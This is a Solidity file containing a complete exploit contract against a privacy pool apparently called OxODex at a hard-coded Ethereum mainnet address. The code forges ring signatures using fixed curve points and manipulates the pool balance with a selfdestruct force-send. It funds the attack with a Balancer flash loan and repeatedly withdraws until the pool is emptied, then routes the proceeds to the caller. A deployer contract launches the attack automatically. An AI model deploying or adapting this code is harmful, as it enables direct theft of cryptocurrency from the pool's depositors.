// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

library $
{
	address public constant DEX_PROXY = 0x3d18AD735f949fEbD59BBfcB5864ee0157607616;
	address public constant DEX_IMPL = 0x6128d5F7c64Dab48a1C66f9D62EaeFa1d5aA03ed;
	address public constant TOKEN_STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
	address public constant TOKEN_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
	address public constant VAULT_BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
	address public constant UNI_V2_Router2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) payable external;
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) payable external;
}

library Types {
    enum WithdrawalType {
        Direct,
        Swap
    }
}

struct WithdrawalData {
    /// The amount to withdraw`
    uint256 amount;
    /// The index of the ring
    uint256 ringIndex;
    /// Signed message parameters
    uint256 c0;
    uint256[2] keyImage;
    uint256[] s;
    Types.WithdrawalType wType;
}

interface IOxODexPool {
    function deposit(uint256 _amount, uint256[4] memory _publicKey) external payable;

    function withdraw(address payable recipient, WithdrawalData memory withdrawalData, uint256 relayerGasCharge)
        external;

    function swapOnWithdrawal(
        address tokenOut,
        address payable recipient,
        uint256 relayerGasCharge,
        uint256 amountOut,
        uint256 deadline,
        WithdrawalData memory withdrawalData
    ) external;

    function getCurrentRingIndex(uint256 amountToken) external view returns (uint256);

    function getRingHash(uint256 _amountToken, uint256 _ringIndex) external view returns (bytes32);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ForceSend {
	constructor() payable {
		selfdestruct(payable($.DEX_PROXY));
	}
}

contract Exploit is IFlashLoanRecipient {
	// begin sync with library Sig1
	uint256 private constant Bx = 1368015179489954701390400359078579693043519447331113978918064868415326638035;
	uint256 private constant By = 9918110051302171585080402603319702774565515993150576347155970296011118125764;
	uint256 private constant Hx = 2286484483920925456308759965850684826720807236777393886284879343816677643124;
	uint256 private constant Hy = 1804024400776434902361310543986557260474938171670710692674407862657333646188;
	uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;

	function ecAdd(uint256[2] memory p, uint256[2] memory q)
	internal view returns (uint256[2] memory r) {
		assembly {
			let fp := mload(0x40)
			mstore(fp, mload(p))
			mstore(add(fp, 0x20), mload(add(p, 0x20)))
			mstore(add(fp, 0x40), mload(q))
			mstore(add(fp, 0x60), mload(add(q, 0x20)))
			pop(staticcall(gas(), 0x06, fp, 0x80, r, 0x40))
		}
	}

	function ecMul(uint256[2] memory p, uint256 k)
	internal view returns (uint256[2] memory kP) {
		assembly {
			let fp := mload(0x40)
			mstore(fp, mload(p))
			mstore(add(fp, 0x20), mload(add(p, 0x20)))
			mstore(add(fp, 0x40), k)
			pop(staticcall(gas(), 0x07, fp, 0x60, kP, 0x40))
		}
	}

	function cH1(
		bytes32 ringHash,
		address recv,
		uint256[2] memory p1,
		uint256[2] memory p2
	) internal pure returns (uint256 hash)
	{
		// H1(L, y~, m, p1, p2)
		assembly {
			let fp := mload(0x40)
			mstore(fp, 0x1)
			mstore(add(fp, 0x20), 0x2)
			mstore(add(fp, 0x40), Bx)
			mstore(add(fp, 0x60), By)
			mstore(add(fp, 0x80), Hx)
			mstore(add(fp, 0xa0), Hy)

			mstore(add(fp, 0xd4), recv)
			mstore(add(fp, 0xc0), ringHash)

			// tail at 0xf4 (0xe0 + 20)
			mstore(add(fp, 0xf4), mload(p1))
			mstore(add(fp, 0x114), mload(add(p1, 0x20)))
			mstore(add(fp, 0x134), mload(p2))
			mstore(add(fp, 0x154), mload(add(p2, 0x20)))

			hash := mod(keccak256(fp, 0x174), curveN)
		}
	}

	// message := abi.encodePacked(ringHash, recAddr)
	function generateSignature(
		bytes32 ringHash,
		address recv
	) public view returns (
		uint256[2] memory c,
		uint256[2] memory s )
	{
		uint256[2] memory G;
		uint256[2] memory H;
		uint256[2] memory B;
		G[0] = 0x1; G[1] = 0x2;
		H[0] = Hx; H[1] = Hy;
		B[0] = Bx; B[1] = By;

		// c_1 = H1(L, y~, m, G, H)
		c[1] = cH1(ringHash, recv, G, H);
		// pick s1 := 1
		s[1] = 1;
		c[0] = cH1(ringHash, recv,
			ecAdd(G, ecMul(B, c[1])),
			ecMul(H, c[1]+1) );
		// s0 := u - p_0 * c_0 (mod N)
		// this is NOT likely to overflow
		s[0] = curveN + 1 - c[0];
	}
	// end library Sig1

	IOxODexPool private constant Pool =
		IOxODexPool($.DEX_PROXY);
	IWETH private constant WrappedEther =
		IWETH($.TOKEN_WETH);
	IUniswapV2Router02 R2 = IUniswapV2Router02($.UNI_V2_Router2);
	//IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
	IERC20 private constant USDT = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

	function addFee(uint256 realAmount) internal pure
	returns (uint256 total) {
		total = realAmount + realAmount * 9 / 1000;
	}

	function deposit(uint256 amount) internal
	returns (uint256 ringIndex) {
		uint256[4] memory pks = [
			0x1, 0x2,
			Bx, By
		];
		ringIndex = Pool.getCurrentRingIndex(amount);
		Pool.deposit{value: addFee(amount)} (amount, pks);
	}

	function withdrawData(address recv, uint256 amount, uint256 ringIndex)
	internal view returns (WithdrawalData memory w)
	{
		bytes32 ringHash = Pool.getRingHash(amount, ringIndex);
		uint256[2] memory c;
		uint256[2] memory s;
		(c, s) = generateSignature(ringHash, recv);

		w.amount = amount;
		w.ringIndex = ringIndex;
		w.c0 = c[0];
		w.keyImage = [Hx, Hy];
		w.s = new uint256[](2);
		w.s[0] = s[0]; w.s[1] = s[1];
		// 0 value is Direct
		//w.wType = Types.WithdrawalType.Direct;
	}

	function ZZaZZ() external {
		// send ETH so pool balance is a multiple of 10
		uint256 ri = $.DEX_PROXY.balance;
		ri = 10 ether - (ri - (ri / 10 ether) * 10 ether);
		new ForceSend{value: ri}();

		WithdrawalData memory w;
		// alter lastAmount to 10
		ri = deposit(10 ether);
		w = withdrawData(address(this), 10 ether, ri);
		w.wType = Types.WithdrawalType.Swap;
		Pool.swapOnWithdrawal(
			address(USDT),
			payable(address(this)),
			0, 0, block.timestamp,
			w);

		while ($.DEX_PROXY.balance >= 10 ether) {
			ri = deposit(0.1 ether);
			w = withdrawData(address(this), 0.1 ether, ri);
			// type is Direct
			Pool.swapOnWithdrawal(
				address(USDT),
				payable(address(this)),
				0, 0, block.timestamp,
				w);
		}
	}

	function receiveFlashLoan(
		address[] memory,
		uint256[] memory amounts,
		uint256[] memory fees,
		bytes memory
	) payable external {
		// convert back to ETH
		WrappedEther.withdraw(amounts[0]);
		this.ZZaZZ();

		USDT.approve(address(R2), ~uint256(0));
		address[] memory path = new address[](2);
		path[0] = address(USDT); path[1] = $.TOKEN_WETH;
		R2.swapExactTokensForETH(
			USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
		);
		WrappedEther.deposit{value: amounts[0]+fees[0]}();
		IERC20($.TOKEN_WETH).transfer($.VAULT_BALANCER, amounts[0]+fees[0]);
		payable(tx.origin).transfer(address(this).balance);
	}

	function LetsDoThis() external
	{
		uint256 loan = 11 ether;

		address[] memory tokens = new address[](1);
		tokens[0] = $.TOKEN_WETH;
		uint256[] memory amounts = new uint256[](1);
		amounts[0] = loan;

		IVault($.VAULT_BALANCER).flashLoan(
			this,
			tokens, amounts, "");
	}

	receive() payable external {}
}

contract Deployer {
	constructor() payable {
		Exploit exp = new Exploit();
		exp.LetsDoThis();
	}
}